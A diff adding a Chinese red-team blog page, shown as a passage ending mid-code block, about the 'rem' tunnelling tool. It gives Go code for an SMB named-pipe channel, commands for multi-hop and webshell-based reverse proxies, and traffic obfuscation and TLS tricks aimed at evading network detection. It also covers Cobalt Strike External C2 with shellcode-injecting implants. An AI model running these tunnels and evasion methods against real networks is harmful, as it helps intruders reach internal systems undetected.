+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_9" id="__nav_9_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Blog
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_9_2" id="__nav_9_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Archive
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Archive
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../archive/2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2024
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../archive/2023/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2023
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../archive/2022/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2022
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+  <h1>攻防场景中的网络侧对抗革命 (下)   rem</h1>
+
+<h2 id="前言">前言<a class="headerlink" href="#前言" title="Permanent link">&para;</a></h2>
+<p>在上一部分中，我们介绍了rem的设计与实现。 而当我们完成了基础的构建，现在可以做得更多！</p>
+<p>网络侧的对抗强度远远不如端上对抗激烈， 只需要很简单的方法就能绕过所有的设备。 rem提供了这样的潜力。</p>
+<blockquote>
+<p>为了规避潜在的风险，rem-community中没有特别激进的技术，大多只提供了设计思路。 但在理解原理后， 将需求告诉cursor， 可以非常轻易的实现本文提到的所有内容。</p>
+</blockquote>
+<p>本文将结合各种实战场景， 进一步探索rem在各个场景中的玩法。 <strong>本文的内容涉及大量专业知识和代码，建议结合代码阅读</strong></p>
+<h2 id="传输层">传输层<a class="headerlink" href="#传输层" title="Permanent link">&para;</a></h2>
+<p>在前文中已经介绍过rem的架构。 简单回顾一下， 任何能进行数据交换的信道都可以被封装为rem的传输层，基于此构建各种应用。 </p>
+<p>理论上只要存在数据交换， 就能构建rem传输层， 出于性能考虑TCP/UDP之类的常见协议是最推荐的选项， 但面对一些极端场景时，我们可以基于rem的架构快速实现不同传输层的信道。 </p>
+<p>在上文中， 我们简单介绍了传输层的定义, 实际上就是对golang原有接口的简单包装， 这是为了最大程度兼容golang生态的设计, 不进行过多抽象。 </p>
+<div class="highlight"><pre><span></span><code><span class="kd">type</span><span class="w"> </span><span class="nx">TunnelDialer</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">Dial</span><span class="p">(</span><span class="nx">dst</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w">  </span>
+<span class="p">}</span>
+
+<span class="kd">type</span><span class="w"> </span><span class="nx">TunnelListener</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">net</span><span class="p">.</span><span class="nx">Listener</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">Listen</span><span class="p">(</span><span class="nx">dst</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Listener</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w">  </span>
+<span class="p">}</span>
+</code></pre></div>
+<p>也因如此， 我们只需要简单实现基本接口，就能将一个从未有人实现过的传输层实现为rem的虚拟传输层。 </p>
+<p>我们以一个应该没有其他golang工具实现过的传输层为例， 编写一个新的传输层。 </p>
+<p>这是基于远程SMB命名管道实现的rem传输层:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">func</span><span class="w"> </span><span class="nx">NewUnixDialer</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="nx">UnixDialer</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">UnixDialer</span><span class="p">{</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">meta</span><span class="p">:</span><span class="w"> </span><span class="nb">make</span><span class="p">(</span><span class="nx">core</span><span class="p">.</span><span class="nx">Metas</span><span class="p">),</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="p">}</span><span class="w">  </span>
+
+<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">*</span><span class="nx">UnixDialer</span><span class="p">)</span><span class="w"> </span><span class="nx">Dial</span><span class="p">(</span><span class="nx">dst</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">u</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">NewURL</span><span class="p">(</span><span class="nx">dst</span><span class="p">)</span><span class="w">  </span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">c</span><span class="p">.</span><span class="nx">meta</span><span class="p">[</span><span class="s">&quot;url&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">u</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">host</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">u</span><span class="p">.</span><span class="nx">Hostname</span><span class="p">()</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">pipePath</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="s">`\\`</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">`\pipe\`</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">u</span><span class="p">.</span><span class="nx">PathString</span><span class="p">()</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">utils</span><span class="p">.</span><span class="nx">Log</span><span class="p">.</span><span class="nx">Debugf</span><span class="p">(</span><span class="s">&quot;dial pipe: %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">pipePath</span><span class="p">)</span><span class="w">  </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">winio</span><span class="p">.</span><span class="nx">DialPipe</span><span class="p">(</span><span class="nx">pipePath</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="p">)</span><span class="w">  </span>
+<span class="p">}</span><span class="w">  </span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">NewUnixListener</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="nx">UnixListener</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">UnixListener</span><span class="p">{</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">meta</span><span class="p">:</span><span class="w"> </span><span class="nb">make</span><span class="p">(</span><span class="nx">core</span><span class="p">.</span><span class="nx">Metas</span><span class="p">),</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="p">}</span><span class="w">  </span>
+
+<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">*</span><span class="nx">UnixListener</span><span class="p">)</span><span class="w"> </span><span class="nx">Listen</span><span class="p">(</span><span class="nx">dst</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Listener</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">pipeUrl</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">NewURL</span><span class="p">(</span><span class="nx">dst</span><span class="p">)</span><span class="w">  </span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">pipeUrl</span><span class="p">.</span><span class="nx">Hostname</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;0.0.0.0&quot;</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">pipeUrl</span><span class="p">.</span><span class="nx">SetHostname</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">)</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">pipeUrl</span><span class="p">.</span><span class="nx">PathString</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">pipeUrl</span><span class="p">.</span><span class="nx">Path</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">meta</span><span class="p">[</span><span class="s">&quot;pipe&quot;</span><span class="p">].(</span><span class="kt">string</span><span class="p">)</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">pipePath</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">`\\%s\pipe\%s`</span><span class="p">,</span><span class="w"> </span><span class="nx">pipeUrl</span><span class="p">.</span><span class="nx">Hostname</span><span class="p">(),</span><span class="w"> </span><span class="nx">pipeUrl</span><span class="p">.</span><span class="nx">PathString</span><span class="p">())</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">c</span><span class="p">.</span><span class="nx">meta</span><span class="p">[</span><span class="s">&quot;url&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">pipeUrl</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">config</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">winio</span><span class="p">.</span><span class="nx">PipeConfig</span><span class="p">{</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">SecurityDescriptor</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;D:P(A;;GA;;;WD)&quot;</span><span class="p">,</span><span class="w"> </span><span class="c1">// WD 表示 Everyone，允许所有人访问  </span>
+<span class="w">       </span><span class="nx">MessageMode</span><span class="p">:</span><span class="w">        </span><span class="kc">true</span><span class="p">,</span><span class="w">              </span><span class="c1">// 消息模式  </span>
+<span class="w">       </span><span class="nx">InputBufferSize</span><span class="p">:</span><span class="w">    </span><span class="mi">65536</span><span class="p">,</span><span class="w">             </span><span class="c1">// 默认缓冲区大  </span>
+<span class="w">       </span><span class="nx">OutputBufferSize</span><span class="p">:</span><span class="w">   </span><span class="mi">65536</span><span class="p">,</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+
+<span class="w">    </span><span class="nx">listener</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">winio</span><span class="p">.</span><span class="nx">ListenPipe</span><span class="p">(</span><span class="nx">pipePath</span><span class="p">,</span><span class="w"> </span><span class="nx">config</span><span class="p">)</span><span class="w">  </span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">utils</span><span class="p">.</span><span class="nx">Log</span><span class="p">.</span><span class="nx">Debugf</span><span class="p">(</span><span class="s">&quot;listen pipe: %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">pipePath</span><span class="p">)</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">c</span><span class="p">.</span><span class="nx">listener</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">listener</span><span class="w">  </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">listener</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="w">  </span>
+<span class="p">}</span>
+</code></pre></div>
+<p>实际上这些代码大多都是ai生成的，我只进行了输出输出的统一风格。</p>
+<h3 id="其他信道">其他信道<a class="headerlink" href="#其他信道" title="Permanent link">&para;</a></h3>
+<p>非常有用的信道还有例如wireguard, tor,  dns(doh), unix socket, SMB 等等. 有一些在rem-community 中已经实现，其他的实现也不困难。这些信道在不同的领域有不同的用途。</p>
+<p>在这里可以看到rem已经支持的所有信道: <a href="https://github.com/chainreactors/rem-community/tree/master/protocol/tunnel">https://github.com/chainreactors/rem-community/tree/master/protocol/tunnel</a></p>
+<p>在github 自动编译的release中只使用了tcp/udp两个最常用的信道。如果有更多的信道需求, 可以通过rem自带的条件编译工具 <a href="https://github.com/chainreactors/rem-community/blob/master/build.sh">https://github.com/chainreactors/rem-community/blob/master/build.sh</a> 实现。</p>
+<div class="highlight"><pre><span></span><code>sh<span class="w"> </span>./build.sh<span class="w"> </span>-o<span class="w"> </span><span class="s2">&quot;windows/amd64&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="s2">&quot;unix&quot;</span>
+</code></pre></div>
+<h3 id="级联">级联<a class="headerlink" href="#级联" title="Permanent link">&para;</a></h3>
+<p>对于攻防场景中, 难免有大量需要跨过多层网络的场景，也就是常说的级联。</p>
+<p>在古早时期， 常通过传递式的端口转发， 例如使用lcx,ew之类的工具将代理从层层内网中转发到外部。 </p>
+<p>一些的现代的工具的实现方式有点像C2， 例如 Stowaway, venom则会监听一个端口， 通过反连的方式在内存中进行socks5的交互， 而不是直接监听一个socks5端口。<strong>本质上是基于多路复用协议(smux, ymux等)在内存中将一个连接复用为多个不同应用的连接。</strong> </p>
+<p>rem的实现也是类似, 只不过为了去掉多路复用协议的特征(<strong>静态特征和统计学特征</strong>), rem自行实现一个简单的多路复用。 </p>
+<p>示例： 假设A(外部服务器) -- B (内网边界) -- C(内网核心)</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># A </span>
+<span class="c1"># 监听rem cnosole</span>
+
+./rem<span class="w"> </span>-a<span class="w"> </span>A
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="c1"># B</span>
+<span class="c1"># 监听服务, 并连接到A</span>
+
+./rem<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;tcp://&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;[A rem_link]&#39;</span><span class="w"> </span>-a<span class="w"> </span>B
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="c1"># C</span>
+<span class="c1"># 通过B连接到A</span>
+
+./rem<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;[B rem_link]&#39;</span><span class="w"> </span>-d<span class="w"> </span>A
+</code></pre></div>
+<div class="admonition tips">
+<p class="admonition-title">-a 与 -d参数</p>
+<p>-a参数表示当前节点别名，为空则随机生成
+-d表示目的节点名称， 为空则表示rem_link指向的节点</p>
+</div>
+<p>而在实战场景中， 还有一大类的级联需求。 </p>
+<p>在现代网络环境中，经常会遇到不出网的内网。 大部分的解决思路都是通过icmp, dns等信道实现出网。 但需要仔细思考一下， 复杂业务真的能离开互联网独立运行么？ </p>
+<p>实际上大多数场景都是通过内网代理（socks5/http）等实现出网， 让业务能够访问到外部应用。 </p>
+<p>这里的场景可以细分为：</p>
+<ol>
+<li>内网代理有验证， 例如打开了socks5和http的auth</li>
+<li>内网代理入方向IP白名单，需要通过横向到指定白名单搭建rem</li>
+<li>内网代理出方向IP白名单，大部分基于SNI或者Host实现校验，可以通过域前置rem或者SNI伪造搭建rem</li>
+</ol>
+<p>只需要让工具支持socks5,http等协议即可实现级联。 </p>
+<p>不过现在还有一种解决方案，在前段时间发了一篇关于golang proxyclient的文章</p>
+<blockquote>
+<p><a href="https://chainreactors.github.io/wiki/blog/2025/02/14/proxyclient-introduce/">拓展golang代理的边界 proxyclient</a></p>
+</blockquote>
+<p>里面实现了neoreg与suo5的proxy client</p>
+<p>我们可以通过neoreg/suo5 信道搭建rem， 实现类似 <a href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a> 的功能。可以将外部的C2端口转发到内网， 或者搭建reverse proxy等等各种用途。</p>
+<p>甚至此举还能提高neoreg/suo5的性能， 因为rem实现了多路复用，而golang的网络性能远远强于基于webshell实现的server，webshell侧只需要维护一条信道，可以最大程度利用带宽。 </p>
+<p>示例： 假设A(外部服务器) -- B (内网边界)</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># B</span>
+<span class="c1"># 搭建rem console</span>
+
+./rem<span class="w"> </span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="c1"># A</span>
+<span class="c1"># 通过webshell搭建rem 传输层, 搭建反向代理</span>
+
+./rem<span class="w"> </span>-c<span class="w"> </span><span class="o">[</span>B<span class="w"> </span>rem_link<span class="o">]</span><span class="w"> </span>--forward<span class="w"> </span>suo5://webshell_url/<span class="w"> </span>-m<span class="w"> </span>proxy<span class="w"> </span>-l<span class="w"> </span>socks5://
+</code></pre></div>
+<h3 id="lolc2">lolC2<a class="headerlink" href="#lolc2" title="Permanent link">&para;</a></h3>
+<p><a href="https://lolc2.github.io/">https://lolc2.github.io/</a>  是一个知名的基于合法服务构建C2信道的合集网站。 大致原理是通过一些原有的功能实现数据交换， 可能是评论、邮件、帖子、播放列表等等方式实现。 理论上存在数据交换就可以作为C2信道。 </p>
+<p>对于一般C2来说， 基于lolc2实现一个信道并不困难。 但是请注意， rem是构建了一个虚拟传输层， 在这个传输层上构建了各种各样的应用（在上一篇文章中提到过如何使用ARQ协议将不可靠的信道变为可靠的信道）。</p>
+<p>如果出于性能考虑，优先寻找能够流式传输的接口。 当然如果没有这样的接口， 也可以使用HTTP协议实现， 通过单工信道模拟双工，就像是neoreg做的一样。 </p>
+<p>可以参考下面代码，封装了一组接口，可以将例如HTTP协议的单工信道模拟成双工信道（实际上还是单工）：</p>
+<p>单工信道模拟双工通信:
+<a href="https://github.com/chainreactors/rem-community/blob/master/x/kcp/simplex.go">https://github.com/chainreactors/rem-community/blob/master/x/kcp/simplex.go</a></p>
+<p>基于http协议的具体实现， 将http协议模拟为双工通讯
+<a href="https://github.com/chainreactors/rem-community/blob/master/x/kcp/http.go">https://github.com/chainreactors/rem-community/blob/master/x/kcp/http.go</a></p>
+<p>假设有一个可信服务能交换数据，只需要根据http协议进行简单的修改， 即可构建一个基于该服务的双工通讯信道。 </p>
+<h2 id="加密混淆">加密混淆<a class="headerlink" href="#加密混淆" title="Permanent link">&para;</a></h2>
+<p>对于网络侧对抗来说，数据安全不仅仅是将数据加密，还有伪装与模拟、密码学前向与后向安全、防主动探测等等细分场景。</p>
+<p>说到流量加密混淆， 攻防场景中使用的技巧其实极为原始。 在这个领域玩出花来的还是得是某些不可说的工具。 有一些非常强大的实现可以参考， 例如：clash-core, sing-box, Xray-core。 </p>
+<p>这个部分不便介绍的过于详细。 在长年累月的对抗中，他们甚至十年前使用的技术都可以轻松绕过目前所有厂商的NDR/态势感知等网络测设备。 </p>
+<p>而我们要做的，将一些最基础的技巧在rem中实现，就可以让致盲任意网络侧的检测。 </p>
+<p>rem中的wrapper分为两类， 通过是否是加密用途区分</p>
+<h3 id="加密">加密<a class="headerlink" href="#加密" title="Permanent link">&para;</a></h3>
+<p><strong>加密用途的wrapper需要支持流式加密。</strong> </p>
+<p>rem中只实现了非常基础的xor和AES-CFB加密。</p>
+<p>rem在默认启动时会随机生成2-4组加密配置， 嵌套加密。 也就是rem_link中长长的那一串wrapper的配置。 </p>
+<div class="highlight"><pre><span></span><code><span class="kd">func</span><span class="w"> </span><span class="nx">GenerateRandomWrapperOption</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="nx">WrapperOption</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="nx">name</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">AvailableWrappers</span><span class="p">[</span><span class="nx">rand</span><span class="p">.</span><span class="nx">Intn</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nx">AvailableWrappers</span><span class="p">))]</span><span class="w">  </span>
+
+<span class="w">    </span><span class="nx">opt</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">WrapperOption</span><span class="p">{</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">Name</span><span class="p">:</span><span class="w">    </span><span class="nx">name</span><span class="p">,</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">Options</span><span class="p">:</span><span class="w"> </span><span class="nb">make</span><span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">),</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+
+<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="nx">AESWrapper</span><span class="p">:</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">opt</span><span class="p">.</span><span class="nx">Options</span><span class="p">[</span><span class="s">&quot;key&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nx">RandomString</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">opt</span><span class="p">.</span><span class="nx">Options</span><span class="p">[</span><span class="s">&quot;iv&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nx">RandomString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="w">  </span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="nx">XORWrapper</span><span class="p">:</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">opt</span><span class="p">.</span><span class="nx">Options</span><span class="p">[</span><span class="s">&quot;key&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nx">RandomString</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="w">  </span>
+<span class="w">       </span><span class="nx">opt</span><span class="p">.</span><span class="nx">Options</span><span class="p">[</span><span class="s">&quot;iv&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">utils</span><span class="p">.</span><span class="nx">RandomString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">opt</span><span class="w">  </span>
+<span class="p">}</span>
+</code></pre></div>
+<p>如果有更强的密码学安全需求， 可以基于pgp/age等库自行实现。</p>
+<p><strong>为了不引起不必要的误会， rem-community中只添加了最为基础的加密混淆方案。</strong> </p>
+<h3 id="伪装">伪装<a class="headerlink" href="#伪装" title="Permanent link">&para;</a></h3>
+<p>非加密用途的wrapper， 例如padding和compress。</p>
+<p>前者用来填充指定数据，用来模拟某些协议的协议头， 后者是用来实现数据压缩的。 </p>
+<p>通过各种wrapper的组合， 我们可以自定义任意的流量特征。 wrapper会按照顺序依次处理数据。 </p>
+<p>通过padding 给数据HTTP协议头 &rarr; 实现一个gzip的压缩wrapper </p>
+<p>这样就能将数据伪造成http的上传下载流量。</p>
+<p>这个功能目前没有通过命令行对外封装， 如果想要实现特定的效果， 需要结合代码实现。 </p>
+<h3 id="tls">TLS<a class="headerlink" href="#tls" title="Permanent link">&para;</a></h3>
+<p>tls是某个不可言说的领域中玩法最多的存在。 常见的玩法包括但不限于:</p>
+<ul>
+<li>tlsintls, 统计学特征消除</li>
+<li>uTLS , tls特征模拟</li>
+<li>ECH,  Encrypted Client Hello</li>
+<li>SNI伪造</li>
+<li>shadowtls</li>
+<li>reality</li>
+</ul>
+<p>大部分厂商的网络设备对于frp，nps之类的工具识别都基于tls的加密套件和默认特征实现。 而只需要其中1-2个技术， 就能完全规避检测。 </p>
+<p>这里的技术有一定风险， 所以rem-community中只添加了已经被披露了明显特征(只是对于某个领域有特征，对于网络侧攻防对抗并没有大多特征)的tlsintls。 其他技术可以自行研究， 实现起来并不复杂。 </p>
+<h2 id="cobaltstrike联动">CobaltStrike联动<a class="headerlink" href="#cobaltstrike联动" title="Permanent link">&para;</a></h2>
+<h3 id="proxy">Proxy<a class="headerlink" href="#proxy" title="Permanent link">&para;</a></h3>
+<p>cobaltstrike的listener配置中提供了http-proxy, 可以通过rem搭建一个http_proxy, 即可将流量转发到外网。 </p>
+<div class="highlight"><pre><span></span><code>rem -c [rem_link] -m proxy -l http://:8080
+</code></pre></div>
+<p>然后在CS中配置listener即可</p>
+<p><img alt="" src="../assets/Pasted%20image%2020250410000730.png" /></p>
+<h3 id="external-c2">External C2<a class="headerlink" href="#external-c2" title="Permanent link">&para;</a></h3>
+<p>还有更高级的玩法. CS在早几年前就实现了一个简易的第三方信道上线的功能 externalc2.</p>
+<p>官方文档见: <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm</a></p>
+<p>简单来说， 分为两个部分， implant (需自行实现)和 channel (基于rem实现)。 implant需要实现shellcode注入和pipe交互两个功能. channel负责转发流量到external listener。 </p>
+<p>原理很简单， implant初始化后从CS的server获取stager shellcode， 执行对应shellcode， 这个stager基于SMB(pipe)通讯，implant负责将转发 pipe与channel之间的数据。</p>
+<p>在CS中新增external C2 listener</p>
+<p><img alt="" src="../assets/Pasted%20image%2020250410000957.png" /></p>
+<p>然后rem构建对应协议的应用层为CS， 可以任意选择传输层
+<div class="highlight"><pre><span></span><code>./rem -c [rem_link] -m proxy -l cs://:12345 -r raw://
